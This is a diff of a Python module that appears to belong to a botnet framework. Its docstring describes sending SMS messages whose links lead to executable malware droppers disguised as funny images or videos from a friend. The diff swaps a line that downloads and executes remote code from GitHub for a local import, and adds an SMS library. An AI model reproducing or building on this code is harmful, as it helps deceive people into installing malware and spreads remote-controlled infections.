@@ -9,10 +9,11 @@ import imp
 import Queue
 import urllib
 
+# packages
+import twilio
+
 # utilities
-util = imp.new_module('util')
-exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
-sys.modules['util'] = util
+import core.util as util
 
 # globals
 command = True
@@ -26,10 +27,6 @@ Use an anonymous online phone number to send an SMS text message
 containing download links to executable client droppers disguised 
 as a link to a funny image/video on Imgur/YouTUbe sent from a friend
 """
-
-# setup
-if util.is_compatible(platforms, __name__):
-    util.imports(packages, globals())
 
 # main
 def run(message=None, number=None, sid=None, token=None):
